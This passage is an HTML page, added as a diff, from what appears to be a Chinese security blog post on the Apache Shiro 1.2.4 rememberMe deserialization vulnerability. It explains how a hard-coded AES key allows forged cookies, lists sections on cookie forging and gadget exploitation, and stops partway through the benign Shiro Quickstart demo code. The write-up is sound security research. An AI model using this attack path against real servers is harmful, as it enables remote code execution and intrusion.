@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Shiro作为Java的一个安全框架，其中提供了登录时的RememberMe功能，让用户在浏览器关闭重新打开后依然能恢复之前的会话。而实现原理就是将储存用户身份的对象序列化并通过AES加密、base64编码储存在cookie中，只要能伪造cookie就能让服务器反序列化任意对象，而1.2.4版本及以下AES加密时采用的key是硬编码在代码中的，这就为伪造cookie提供了机会。只要remember">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro 1.2.4 反序列化漏洞">
+<meta property="og:url" content="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="Shiro作为Java的一个安全框架，其中提供了登录时的RememberMe功能，让用户在浏览器关闭重新打开后依然能恢复之前的会话。而实现原理就是将储存用户身份的对象序列化并通过AES加密、base64编码储存在cookie中，只要能伪造cookie就能让服务器反序列化任意对象，而1.2.4版本及以下AES加密时采用的key是硬编码在代码中的，这就为伪造cookie提供了机会。只要remember">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321145837383.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321161842461.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162413295.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162537299.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162602475.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162720187.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321163758120.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170531049.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170728781.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321172033719.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321174309740.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201103424.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201229223.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201833615.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202502782.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202614429.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202938567.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321203344204.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204401719.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204557024.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205506865.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205933941.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205846991.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321210454929.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212123639.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212426443.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212650537.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321213458543.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321214045866.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321220720903.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221012855.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221502601.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221616027.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221705778.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321222156614.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321224754536.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235149421.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235309952.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000638321.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000820672.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000851697.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235751863.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322003851696.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322012002559.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322135132673.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133230697.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133300379.png">
+<meta property="og:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133333045.png">
+<meta property="article:published_time" content="2020-03-21T05:43:04.000Z">
+<meta property="article:modified_time" content="2020-04-28T10:20:00.000Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="Java反序列化漏洞">
+<meta property="article:tag" content="Shiro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","path":"2020/03/21/Shiro-1-2-4-反序列化漏洞/","title":"Shiro 1.2.4 反序列化漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Shiro 1.2.4 反序列化漏洞 | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro"><span class="nav-number">1.</span> <span class="nav-text">Shiro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E8%B0%83%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">动调环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="nav-number">3.1.</span> <span class="nav-text">序列化、加密过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">解密、反序列化过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie%E8%A7%A3%E5%AF%86%E5%8F%8A%E4%BC%AA%E9%80%A0%E8%84%9A%E6%9C%AC"><span class="nav-number">3.3.</span> <span class="nav-text">cookie解密及伪造脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie%E8%A7%A3%E5%AF%86"><span class="nav-number">3.3.1.</span> <span class="nav-text">cookie解密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie%E4%BC%AA%E9%80%A0"><span class="nav-number">3.3.2.</span> <span class="nav-text">cookie伪造</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-gadget%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.1.</span> <span class="nav-text">DNS gadget验证漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#commons-collections4"><span class="nav-number">4.2.</span> <span class="nav-text">commons-collections4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F"><span class="nav-number">4.3.</span> <span class="nav-text">其他方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What-made-the-ysoserial-payloads-fail"><span class="nav-number">5.</span> <span class="nav-text">What made the ysoserial payloads fail?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Shiro 1.2.4 反序列化漏洞 | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shiro 1.2.4 反序列化漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-03-21 13:43:04" itemprop="dateCreated datePublished" datetime="2020-03-21T13:43:04+08:00">2020-03-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2020-04-28 18:20:00" itemprop="dateModified" datetime="2020-04-28T18:20:00+08:00">2020-04-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Shiro作为Java的一个安全框架，其中提供了登录时的RememberMe功能，让用户在浏览器关闭重新打开后依然能恢复之前的会话。而实现原理就是将储存用户身份的对象序列化并通过AES加密、base64编码储存在cookie中，只要能伪造cookie就能让服务器反序列化任意对象，而1.2.4版本及以下AES加密时采用的key是硬编码在代码中的，这就为伪造cookie提供了机会。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
+<span id="more"></span>
+
+<h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><p>Apache Shiro 是 Java 的一个安全框架，可以帮助我们完成：认证、授权、加密、会话管理等。类似的还有Spring Security，相较之下Shiro更加简单易用且灵活，不跟任何的框架或者容器绑定，可以独立运行。</p>
+<p>Shiro下载</p>
+<p><code>git clone https://github.com/apache/shiro.git</code></p>
+<p>然后可以进入其.&#x2F;samples&#x2F;quickstart目录运行下Demo了解Shiro的使用</p>
+<p><code>mvn compile exec:java</code>（失败的话尝试先配置下代理）</p>
+<p>首先看一下配置文件quickstart&#x2F;src&#x2F;main&#x2F;resources&#x2F;shiro.ini</p>
+<p>[users]中创建了几个用户并设置了其密码和角色</p>
+<p>[roles]中创建了不同角色及并设置了其权限</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png" alt="image-20200321144658861"></p>
+<p>然后查看我们运行的Demo代码</p>
+<p>&#x2F;quickstart&#x2F;src&#x2F;main&#x2F;java&#x2F;Quickstart.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Quickstart</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">transient</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(Quickstart.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 载入ini文件，创建Factory</span></span><br><span class="line">        <span class="comment">// 实际业务中应该是从数据库中加载账户信息等数据</span></span><br><span class="line">        Factory&lt;SecurityManager&gt; factory = <span class="keyword">new</span> <span class="title class_">IniSecurityManagerFactory</span>(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> factory.getInstance();</span><br><span class="line"></span><br><span class="line">        SecurityUtils.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get the currently executing user:</span></span><br><span class="line">        <span class="type">Subject</span> <span class="variable">currentUser</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do some stuff with a Session (no need for a web or EJB container!!!)</span></span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> currentUser.getSession();</span><br><span class="line">        session.setAttribute(<span class="string">&quot;someKey&quot;</span>, <span class="string">&quot;aValue&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) session.getAttribute(<span class="string">&quot;someKey&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (value.equals(<span class="string">&quot;aValue&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Retrieved the correct value! [&quot;</span> + value + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// let&#x27;s login the current user so we can check against roles and permissions:</span></span><br><span class="line">        <span class="keyword">if</span> (!currentUser.isAuthenticated()) &#123;</span><br><span class="line">            <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(<span class="string">&quot;lonestarr&quot;</span>, <span class="string">&quot;vespa&quot;</span>);</span><br><span class="line">            token.setRememberMe(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                currentUser.login(token);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownAccountException uae) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;There is no user with username of &quot;</span> + token.getPrincipal());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IncorrectCredentialsException ice) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;Password for account &quot;</span> + token.getPrincipal() + <span class="string">&quot; was incorrect!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LockedAccountException lae) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;The account for username &quot;</span> + token.getPrincipal() + <span class="string">&quot; is locked.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Please contact your administrator to unlock it.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ... catch more exceptions here (maybe custom ones specific to your application?</span></span><br><span class="line">            <span class="keyword">catch</span> (AuthenticationException ae) &#123;</span><br><span class="line">                <span class="comment">//unexpected condition?  error?</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//say who they are:</span></span><br><span class="line">        <span class="comment">//print their identifying principal (in this case, a username):</span></span><br><span class="line">        log.info(<span class="string">&quot;User [&quot;</span> + currentUser.getPrincipal() + <span class="string">&quot;] logged in successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//test a role:</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.hasRole(<span class="string">&quot;schwartz&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;May the Schwartz be with you!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> 